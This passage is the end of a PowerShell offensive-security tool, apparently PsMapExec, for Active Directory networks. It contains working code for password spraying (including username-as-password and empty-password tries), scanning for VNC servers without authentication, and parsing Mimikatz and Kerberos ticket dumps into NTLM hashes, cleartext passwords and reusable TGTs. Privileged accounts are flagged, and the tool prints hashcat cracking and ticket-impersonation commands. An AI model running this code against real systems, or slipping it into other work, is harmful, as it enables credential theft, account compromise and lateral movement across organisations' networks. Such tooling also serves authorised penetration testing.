         }   
            }
            # Check for TGT request success
            elseif ($Attempt.IndexOf("TGT request successful!") -ne -1) {
                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                Write-Host "$Domain\$UserToSpray"
                "$Domain\${UserToSpray}:$Hash" | Out-file -FilePath "$Spraying\$Domain-Hashes-Users.txt" -Encoding "ASCII" -Append
        }
    }

    # Password Spraying
   if ($Password -ne ""){

        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}:$password" | Out-file -FilePath "$Spraying\$Domain-Password-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
        }
    
}


    # Account as password
    if ($AccountAsPassword){

        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$UserToSpray)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}:$UserToSpray" | Out-file -FilePath "$Spraying\$Domain-AccountAsPassword-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
        }
    
}


    # EmptyPasswords
    if ($EmptyPassword){
    $password = ""
       
        $Attempt = $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain",$UserToSpray,$password)
        
        if ($Attempt.name -ne $null){
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            "$Domain\${UserToSpray}" | Out-file -FilePath "$Spraying\$Domain-EmptyPassword-Users.txt" -Encoding "ASCII" -Append
}

        elseif (!$SuccessOnly){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "$Domain\$UserToSpray"
            }
        }
    
    }
}

################################################################################################################
################################################## Function: VNC ###############################################
################################################################################################################
Function Method-VNC {

if ($Port -eq ""){$Port = "5900"} else {$Port = $Port}

# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($ComputerName, $Port)

      $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }


    if (!$connected) {$tcpClient.Close() ; return}

function VNC-NoAuth {
    param(
        [string]$ComputerName,
        [int]$Port
    )
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient($ComputerName, $Port)
    }
    catch {
        Write-Host "Error: Unable to connect to $ComputerName on port $Port"
        return "Connection Error"
    }

    try {
        $networkStream = $tcpClient.GetStream()
        $networkStream.ReadTimeout = 50
        
        # Reading Version from Server
        $buffer = New-Object byte[] 12
        $read = $networkStream.Read($buffer, 0, 12)
        if ($read -eq 0) { throw "No data received from the server" }
        $serverVersionMessage = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
        
        # Sending Client Version
        $buffer = [System.Text.Encoding]::ASCII.GetBytes($serverVersionMessage)
        $networkStream.Write($buffer, 0, $buffer.Length)

        # Reading Supported Security Types
        $buffer = New-Object byte[] 2
        $read = $networkStream.Read($buffer, 0, 1)
        if ($read -eq 0) { throw "No data received from the server" }
        $numberOfSecTypes = $buffer[0]
        $buffer = New-Object byte[] $numberOfSecTypes
        $read = $networkStream.Read($buffer, 0, $numberOfSecTypes)
        if ($read -eq 0) { throw "No data received from the server" }
    }
    catch {
        Write-Host "Error: Handshake failed with $ComputerName on port $Port"
        return "Handshake Error"
    }
    finally {
        # Cleanup
        if ($null -ne $networkStream) { $networkStream.Close() }
        if ($null -ne $tcpClient) { $tcpClient.Close() }
    }

    # Check for Non-authentication (Type 1)
    if ($buffer -contains 1) {
        return "Supported"
    }
    else {
        return "Not Supported"
    }
}

$AuthSupported = VNC-NoAuth -ComputerName $ComputerName -Port $Port
return "$AuthSupported"


}



function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "VNC " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline

          # Attempt to resolve the IP address
        $IP = $null
        $Ping = New-Object System.Net.NetworkInformation.Ping 
        $Result = $Ping.Send($ComputerName, 10)

        if ($Result.Status -eq 'Success') {
            $IP = $Result.Address.IPAddressToString
            Write-Host ("{0,-16}" -f $IP) -NoNewline
        }
    
        else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                if ($result -eq "Not Supported") {
                    if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Red -statusSymbol "[-] " -statusText "AUTH REQUIRED" -NameLength $NameLength -OSLength $OSLength
                            continue
            } 

                if ($result -eq "Handshake Error") {
                    if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "HANDSHAKE ERROR" -NameLength $NameLength -OSLength $OSLength
                            continue
            } 
                elseif ($result -eq "Supported") {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "AUTH NOT REQUIRED" -NameLength $NameLength -OSLength $OSLength
                        $ComputerName | Out-File -FilePath "$VNC\.VNC-Non-Auth.txt" -Encoding "ASCII" -Append
            } 

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

Get-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue" | Sort-Object | Get-Unique | Set-Content -Path "$VNC\.VNC-Non-Auth.txt" -ErrorAction "SilentlyContinue"

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()


}

################################################################################################################
################################################# Function: AdminCount #########################################
################################################################################################################

function AdminCount {
    param (
        [string]$UserName,
        [System.DirectoryServices.DirectorySearcher]$Searcher
    )

    $Searcher.Filter = "(sAMAccountName=$UserName)"
    $Searcher.PropertiesToLoad.Clear()
    $Searcher.PropertiesToLoad.Add("adminCount") > $null

    $user = $Searcher.FindOne()

    if ($user -ne $null) {
        $adminCount = $user.Properties["adminCount"]
        if ($adminCount -eq 1) {
            return $true
        }
    }
    return $false
}

################################################################################################################
################################################## Function: Parse-SAM #########################################
################################################################################################################
function Parse-SAM {
    $SamFull = Test-Path -Path "$PME\SAM\.Sam-Full.txt"
    if (-not $SamFull) {
        New-Item -Path "$PME\SAM\" -Name ".Sam-Full.txt" -ItemType "File" | Out-Null
    }

    Write-Host
    Write-Host
    Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
    Write-Host

    $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
    $lines = @{}

    foreach ($file in $files) {
        $fileLines = Get-Content $file

        foreach ($line in $fileLines) {
            if ([string]::IsNullOrWhiteSpace($line)) {
                continue
            }

            $lineParts = $line -split ':'
            $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
            $computer = $file.BaseName -split '\.' | Select-Object -First 1
            $computerFormed = "{0}" -f $computer

            if ($lines.ContainsKey($lineWithoutNumber)) {
                $lines[$lineWithoutNumber] += "," + $computerFormed
            } else {
                $lines[$lineWithoutNumber] = $computerFormed
            }
        }
    }

    $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
    if ($duplicateLines) {
        foreach ($duplicate in $duplicateLines) {
            $line = $duplicate.Key
            $computers = $duplicate.Value -split ','
            Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
            Write-Host "$line::"
            Write-Host
        }
    }

    Write-Host
    Write-Host "------------------------------ All collected SAM Hashes ----------------------------------------" -ForegroundColor "Yellow"
    Write-Host

    Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
        $Computer = $_.BaseName -split '\.' | Select-Object -First 1
        $ComputerFormed = "[{0}]" -f $Computer
        $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
        $content = Get-Content $_.FullName -Verbose
        $output = foreach ($line in $content) {
            $trimmedLine = $line.Trim()
            if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt $ComputerFormed.Length) {
                $ComputerFormed + $trimmedLine
            }
        }
        $output | Out-File "$SAM\.Sam-Full.txt" -Force "ascii" -Append
    }

    Start-Sleep -Seconds "3"
    (Get-Content "$SAM\.Sam-Full.txt") | Sort-Object -Unique | Sort | Out-File "$SAM\.Sam-Full.txt" -Encoding "ASCII"
    Get-Content "$SAM\.Sam-Full.txt"

    Write-Host ""
    Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
    Write-Host ""
    Write-Host "All SAM hashes written to $PME\SAM\.Sam-Full.txt" -ForegroundColor "Yellow"
    Write-Host ""
}


################################################################################################################
################################################# Function: Parse-LogonPassword ################################
################################################################################################################
function Parse-LogonPasswords {
    Write-Host
    Write-Host
    Write-Host "Parsing Results" -ForegroundColor "Yellow"
    Write-Host
    Start-Sleep -Seconds 1

    function Parse-LogonPassword {
        param (
            [string]$raw
        )

        $userInfo = @{}

        function Process-Match {
            param ([string]$match)

            $username = $domain = $NTLM = $password = $null

            foreach ($line in $match.Split("`n")) {
                switch -Regex ($line) {
                    "Username" { $username = $line.Split(":")[1].Trim() }
                    "Domain" { 
                        # Extracting the domain and keeping only the NetBIOS name
                        $domain = $line.Split(":")[1].Trim()
                        $domain = ($domain -split "\.")[0]
                    }
                    "NTLM" { $NTLM = $line.Split(":")[1].Trim() }
                    "Password" { $password = ($line -split ":", 2)[1].Trim() }
                }
            }

            if ($username -and $username -ne "(null)" -and $domain -and $domain -ne "(null)") {
                $identity = "$domain\$username"

                if (-not $userInfo.ContainsKey($identity)) {
                    $userInfo[$identity] = @{}
                }

                if ($NTLM) {
                    $userInfo[$identity]["NTLM"] = $NTLM
                }

                if ($password -and $password -ne "(null)" -and $password.Length -lt 320) {
                    $userInfo[$identity]["Password"] = $password
                }
            }
        }

        $patterns = @(
            "(?s)(?<=msv :).*?(?=tspkg :)",
            "(?s)(?<=tspkg :).*?(?=wdigest :)",
            "(?s)(?<=wdigest :).*?(?=kerberos :)",
            "(?s)(?<=kerberos :).*?(?=ssp :)"
        )

        foreach ($pattern in $patterns) {
            $raw | Select-String -Pattern $pattern -AllMatches | ForEach-Object {
                $_.Matches.Value | ForEach-Object {
                    if ($_ -match "Domain") {
                        Process-Match -match $_
                    }
                }
            }
        }

        foreach ($identity in $userInfo.Keys) {
            [PSCustomObject]@{
                Identity = $identity
                NTLM = $userInfo[$identity]["NTLM"]
                Password = $userInfo[$identity]["Password"]
                Notes = ""
            }
        }
    }

    # Directory path where the text files are located.
    $LogonPasswordPath = "$LogonPasswords"

    # Retrieve all text files from the directory.
    $Files = Get-ChildItem -Path $LogonPasswordPath -Filter *LogonPasswords.txt

    # Create DirectorySearcher object outside the loop
    $Searcher = New-Searcher -domain "$Domain"

    # Loop through each file in the directory.
    foreach ($File in $Files) {
        # Extract computer name (DNS Hostname) from the file name using regex.
        $Computer = $File.BaseName -replace "-LogonPasswords$", ""

        Write-Host
        Write-Host "-[$Computer]-"
        Write-Host

        # Retrieve the content of the current file.
        $FileOutput = Get-Content -Raw -Path $File.FullName

        # Parse the Mimikatz output and include ComputerName.
        $ParsedResults = Parse-LogonPassword -raw $FileOutput
        # Update each user's notes if they have an AdminCount of 1
        foreach ($user in $ParsedResults) {
            if ($null -ne $user.Identity) {
                $username = $user.Identity.Split('\')[1]
                if (AdminCount -UserName $username -Searcher $Searcher) {
                    $user.Notes = "[AdminCount=1] "
                }
            }
        }

        $ParsedResults |
        Where-Object { $_.NTLM -or $_.Password } |
        ForEach-Object {
            $notesAdditions = @()
            New-Item -ItemType "Directory" -Path $LogonPasswords -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$LogonPasswords\$Computer"

            $userName = ($_.Identity -split '\\')[1]  # Extract username from Identity

            if ($userName -in $DomainAdmins) { $notesAdditions += "[Domain Admin] " }
            if ($userName -in $EnterpriseAdmins) { $notesAdditions += "[Enterprise Admin] " }
            if ($userName -in $ServerOperators) { $notesAdditions += "[Server Operator] " }
            if ($userName -in $AccountOperators) { $notesAdditions += "[Account Operator] " }

            # Check if NTLM value indicates an empty password
            if ($_.NTLM -eq "31d6cfe0d16ae931b73c59d7e0c089c0") {
                $notesAdditions += "[NTLM=Empty Password] "
            }

            if ($($_.Password) -ne $null){
                # Extract username from Identity
                $userName = ($_.Identity -split '\\')[1]  

                # Check if username does not end with $
                if($userName -notmatch '\$$'){
                    $notesAdditions += "[Cleartext Password] "
                }
            }

            $_.Notes += ($notesAdditions -join ' ')

            Write-Host "Username  : $($_.Identity.ToLower())"
            Write-Host "NTLM      : $($_.NTLM)"
            if ($($_.Password) -eq $null) {} Else {Write-Host "Password  : $($_.Password)"}
            if (($_.Notes) -eq ""){} Else {
            Write-Host "Notes     : " -NoNewline

            # Highlight notes in yellow if it contains specific flags
            if ($_.Notes -match "AdminCount=1" -or $_.Notes -match "NTLM=Empty Password" -or $_.Notes -match "Cleartext Password" ) {
                Write-Host -ForegroundColor Yellow -NoNewline "$($_.Notes)"
            } else {
                Write-Host -NoNewline "$($_.Notes)"
            }
            Write-Host ""
            Write-Host ""
            "$($_.Identity):$($_.NTLM)" | Add-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Encoding "ASCII" -Force
            }
            
            Move-Item -Path $File.FullName -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
        }
    }

    Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Sort | Get-unique | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force
    
    # Sometimes blank NTLM values are duplicated, this should ensure they are removed from the file
    $filteredContent = Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Where-Object {$_ -notmatch ":$"}
    $filteredContent | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force

    # Print unique NTLM hashes within the banner
    Write-Host
    Write-Host "-------------------------------------- All collected NTLM User Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
    Write-Host
    Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt"
    Write-Host
    Write-Host "---------------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
    Write-Host 
    Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
    Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
    Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
    Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
}




################################################################################################################
################################################# Function: Parse-eKeys ########################################
################################################################################################################
Function Parse-eKeys {
    Write-Host
    Write-Host
    Write-Host "Parsing Results" -ForegroundColor "Yellow"
    Write-Host
    Start-Sleep -Seconds "1"
    $outputFilePath = "$ekeys\.eKeys-Parsed.txt"

    # Initialize the DirectorySearcher outside of the loop for better performance
    $domainSearcher = New-Object System.DirectoryServices.DirectorySearcher

    Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
        $Computer = $_.BaseName -split '-eKeys' | Select-Object -First 1
        
        New-Item -ItemType "Directory" -Path $eKeys -Name $Computer -Force | Out-Null
        $ComputerDirectory = "$eKeys\$Computer"
        
        Write-Host
        Write-Host
        Write-Host "-[$Computer]-"
        Write-Host

        $filePath = $_.FullName
        $fileContent = Get-Content -Path $filePath -Raw
        Move-Item -Path $filePath -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"

        $pattern = '(?ms)\s\*\sUsername\s:\s(.+?)\s*\r?\n\s*\*\s+Domain\s+:\s(.+?)\s*\r?\n\s*\*\s+Password\s:\s(.+?)\s*\r?\n\s*\*\s+Key List\s:\s(.*?)(?=\r?\n\s\*\sUsername\s:|\r?\n\r?\n)'
        $matches = [regex]::Matches($fileContent, $pattern)

        $uniqueGroups = @{}

        foreach ($match in $matches) {
            $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'
            if (([regex]::Matches($password, ' ')).Count -gt 10) {
                $password = "(Hex Value: Redacted)"
            }            
            
            $domainUsername = "$($domain.ToLower())\$username"
            $groupKey = $domainUsername

            if (!$uniqueGroups.ContainsKey($groupKey)) {
                $notes = ""  # This will store the notes

                # Check for non-null passwords and username not ending with $
                if ($password -ne "(null)" -and $password -ne "(Hex Value: Redacted)" -and ($username -notmatch '\$$')) {
                    $notes += "[Cleartext Password] "
                }

                $isAdminGroupMember = $DomainAdmins -contains $username -or
                                    $EnterpriseAdmins -contains $username -or
                                    $ServerOperators -contains $username -or
                                    $AccountOperators -contains $username

                # Do not display the adminCount if a user is a member of the specified groups
                if (-not $isAdminGroupMember -and (AdminCount -UserName $username -Searcher $domainSearcher)) {
                    $notes += "[AdminCount=1] "
                }

                # Check for Empty Password hash
                if ($keyList -match "rc4_hmac_nt\s+31d6cfe0d16ae931b73c59d7e0c089c0") {
                    $notes += "[rc4_hmac_nt=Empty Password] "
                }

                # Checks for group memberships
                if ($DomainAdmins -contains $username) {
                    $notes += "[Domain Admin] "
                }
                if ($EnterpriseAdmins -contains $username) {
                    $notes += "[Enterprise Admin] "
                }
                if ($ServerOperators -contains $username) {
                    $notes += "[Server Operator] "
                }
                if ($AccountOperators -contains $username) {
                    $notes += "[Account Operator] "
                }

                $group = [PSCustomObject]@{
                    DomainUsername = $domainUsername
                    KeyList = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
                    Password = $password
                    Notes = $notes
                }

                $uniqueGroups[$groupKey] = $group

                Write-Host "Username    : $domainUsername"
                if ($Password -eq "(null)" -or $Password -eq "" -or $Password -eq $null){} Else {Write-Host "Password    : $password"}

                foreach ($key in $group.KeyList) {
                    if (![string]::IsNullOrWhiteSpace($key)) {
                        $keyParts = $key.Trim() -split '\s+'
                        Write-Host "$($keyParts[0]) : $($keyParts[1])"
                    }
                }
                                if (-not [string]::IsNullOrWhiteSpace($notes)) {
                    Write-Host "Notes       : " -NoNewline
                    Write-Host $notes -ForegroundColor Yellow -NoNewline
                    Write-Host ""
                }

                Write-Host ""
            }
        }
    }

}



################################################################################################################
############################################## Function: Parse-KerbDump ########################################
################################################################################################################

function Parse-KerbDump {
    Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
    Start-sleep -Seconds "2"

    # Initialize DirectorySearcher
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
    $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")

    # Grab each candidate file for parsing based on the name ending in "KerbDump.txt"
    Get-ChildItem -Path $KerbDump -Filter "*KerbDump.txt" | 
        Where-Object { $_.Length -gt 0 } | 
        ForEach-Object {
            $Computer = $_.BaseName -split '-KerbDump' | Select-Object -First 1
            
            # Create the following flag to track output later
            $DisplayComputerName = $True

            # Create a directory in the name of the computer from which results are parsed from
            New-Item -ItemType "Directory" -Path $KerbDump -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$KerbDump\$Computer"

            # Read the file content
            $FileContent = Get-Content -Path $_.FullName -Raw

            # Define regex pattern to match ticket details
            $pattern = "Service Name\s+:\s+(.+?)`r?`nEncryptionType\s+:\s+(.+?)`r?`nTicket Exp\s+:\s+(.+?)`r?`nServer Name\s+:\s+(.+?)`r?`nUserName\s+:\s+(.+?)`r?`nFlags\s+:\s+(.+?)`r?`nSession Key Type\s+:\s+(.+?)`r?`n"

            # Match and extract details
            $matches = [regex]::Matches($fileContent, $pattern)
            foreach ($match in $matches) {
                $data = @{
                    ServiceName     = $match.Groups[1].Value
                    EncryptionType  = $match.Groups[2].Value
                    TicketExp       = $match.Groups[3].Value
                    ServerName      = $match.Groups[4].Value
                    UserName        = $match.Groups[5].Value
                    Flags           = $match.Groups[6].Value
                    SessionKeyType  = $match.Groups[7].Value
                }

                # Transform the username into a more common format "DOMAIN\Username"
                $userNameParts = $data.UserName -split '@'
                $domainName = ($userNameParts[1] -split '\.')[0]  # Extracting domain name before the dot
                $DomainUserName = $userNameParts[0]

                # If the name contains $ then drop results from current loop. We do not want to see Computer account tickets in results
                if ($DomainUserName -match '\$$') { Continue }

                # Initialize notes variable
                $notes = ""

                # Track if the user is considered "Privileged". Used to help maintain tidy output by omitting some flags if present
                $PrivilegedUser = $false  

                if ($DomainUserName -in $DomainAdmins) { 
                    $notes += "[Domain Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $EnterpriseAdmins) { 
                    $notes += "[Enterprise Admin] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $ServerOperators) { 
                    $notes += "[Server Operator] " 
                    $PrivilegedUser = $true
                }
                if ($DomainUserName -in $AccountOperators) { 
                    $notes += "[Account Operator] " 
                    $PrivilegedUser = $true
                }

                # Check AdminCount only if the user is not already identified as $PrivilegedUser
                if (-not $PrivilegedUser -and (AdminCount -UserName $DomainUserName -Searcher $Searcher)) {
                    $notes += "[AdminCount=1] "
                }

                # if a KRBTGT service is contained within the field, add the tag [TGT] to the results
                if ($data.ServiceName -match "krbtgt/") {
                    $notes += "[TGT] "
                }

                # Only present results if the note field has been populated. This means interesting results have been identified.
                if ($notes -ne "") {
                    if ($DisplayComputerName) {
                        Write-Host "`n`n-[$Computer]-`n"
                        $DisplayComputerName = $false
                    }
                    
                    Write-Host "User Name     : $($domainName.ToLower())\$($DomainUserName)"
                    Write-Host "Service Name  : $($data.ServiceName.ToLower())"
                    if ($data.ServiceName -match "krbtgt/") {} Else {Write-Host "Server Name   : $($data.ServerName.ToLower())"}
                    Write-Host "Ticket Expiry : $($data.TicketExp)"
                    Write-Host -NoNewline "Notes         : "
                    Write-Host -ForegroundColor Yellow -NoNewline "$notes"
                    Write-Host

                    # Logic to help pull just the ticket string
                    $ticketPattern = "-\[Ticket\]-`r?`n`r?`n(.+?)(?:`r?`n|$)"
                    $ticketStartPos = $match.Index + $match.Length
                    $ticketSearchText = $fileContent.Substring($ticketStartPos)
                    if ($ticketSearchText -match $ticketPattern) {
                        $ticketString = $Matches[1]
                        
                        # Replace '\' with '_' in ServiceName, Windows will not accept "/" as part of a file name
                        $data.ServiceName = $data.ServiceName.Replace('/', '@')
                        
                        # Form a path and file name made up of the ticket properties
                        $filePath = "$ComputerDirectory\$($data.UserName)-$($data.ServiceName).txt"
                        $ticketString | Out-File -FilePath $filePath -NoNewline -Encoding "ASCII"
                        
                        # Assign a random variable name to each ticket path to help produce tidy output to console for command generation
                        if ($notes -match "TGT"){
                        do {
                            $randomVarName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
                        } while (Get-Variable -Name $randomVarName -ErrorAction SilentlyContinue -Scope Global)

                        Set-Variable -Name $randomVarName -Value $filePath -Scope Global
                        
                        # A neat one-liner instruction for the user
                        Write-Host "Impersonate   : PsMapExec -Targets All -Method WMI -Ticket `$$randomVarName"
                        Write-Host
                        
                        } Else {Write-Host}
                    }
                }
            }

             # Move and rename the file after processing
            $newFileName = ".$Computer.FullDump.txt"
            Move-Item -Path $_.FullName -Destination "$ComputerDirectory\$newFileName" -Force
        }

    Write-Host "`n`n[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Only interesting results have  been shown. Computer accounts are omitted"
    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Run with -NoParse to prevent parsing results in the future"
    Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
    Write-Host "Each ticket has been stored in $KerbDump"
}


################################################################################################################
################################################# Function: RestoreTicket ######################################
################################################################################################################
Function RestoreTicket{
if (!$CurrentUser) {
    if ($Method -ne "GenRelayList"){
    klist purge | Out-Null
    Start-sleep -Milliseconds 100
    klist purge | Out-Null
    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
        
        }
    }
}

################################################################################################################
################################################ Execute defined functions #####################################
################################################################################################################

switch ($Method) {
        "WinRM" {Method-WinRM}
        "MSSQL" {Method-MSSQL}
        "SMB" {Method-SMB}
        "WMI" {Method-WMIexec}
        "RDP" {Method-RDP}
        "GenRelayList" {GenRelayList}
        "SessionHunter" {Invoke-SessionHunter}
        "Spray" {Spray}
        "VNC" {Method-VNC}
        
        default {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Invalid Method specified"
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Specify either WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
        return
      
      }
 }

if (!$NoParse){if ($Module -eq "SAM"){Parse-SAM}}
if (!$NoParse){if ($Module -eq "eKeys"){Parse-eKeys}}
if (!$NoParse){if ($Module -eq "LogonPasswords"){Parse-LogonPasswords}}
if (!$NoParse){if ($Module -eq "KerbDump"){Parse-KerbDump}}

RestoreTicket

Write-Host ""
$Time = (Get-Date).ToString("HH:mm:ss")
Write-Host "Script Completed : $Time"
$elapsedTime = (Get-Date) - $startTime

# Format the elapsed time
$elapsedHours = "{0:D2}" -f $elapsedTime.Hours
$elapsedMinutes = "{0:D2}" -f $elapsedTime.Minutes
$elapsedSeconds = "{0:D2}" -f $elapsedTime.Seconds
$elapsedMilliseconds = "{0:D4}" -f $elapsedTime.Milliseconds

# Display the formatted elapsed time
$elapsedTimeFormatted = "$elapsedHours h:$elapsedMinutes m:$elapsedSeconds s:$elapsedMilliseconds mi"
Write-Host "Elapsed Time     : $elapsedTime"
Get-Variable | Remove-Variable -ErrorAction SilentlyContinue

}
